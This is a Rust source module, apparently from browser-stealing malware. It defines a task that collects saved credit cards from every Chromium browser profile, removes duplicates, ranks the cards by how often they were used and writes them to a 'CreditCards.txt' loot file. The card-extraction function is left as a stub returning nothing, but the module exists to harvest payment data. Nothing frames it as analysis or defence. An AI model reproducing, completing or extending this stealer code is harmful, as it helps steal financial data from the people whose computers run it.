use alloc::string::{String, ToString};
use crate::alloc::borrow::ToOwned;
use alloc::sync::Arc;
use alloc::vec::Vec;
use tasks::{parent_name, Task};
use utils::path::{Path, WriteToFile};
use crate::chromium::Browser;
use crate::CreditCard;

pub(super) struct CreditCardsTask {
    browser: Arc<Browser>
}

impl CreditCardsTask {
    pub(super) fn new(browser: Arc<Browser>) -> Self {
        Self { browser }
    }
}

impl Task for CreditCardsTask {
    parent_name!("CreditCards.txt");
    
    unsafe fn run(&self, parent: &Path) {
        let mut credit_cards: Vec<CreditCard> = self.browser
            .profiles
            .iter()
            .filter_map(|profile| get_credit_cards(profile))
            .flat_map(|v| v.into_iter())
            .collect();
        
        if credit_cards.is_empty() {
            return
        }
        
        credit_cards.sort();
        credit_cards.dedup();
        
        credit_cards.sort_by(|a, b| b.use_count.cmp(&a.use_count));
        
        let _ = credit_cards
            .iter()
            .map(|credit_card| credit_card.to_string())
            .collect::<Vec<String>>()
            .join("\n\n")
            .write_to(parent);
    }
}

fn get_credit_cards(profile: &Path) -> Option<Vec<CreditCard>> {
    None
}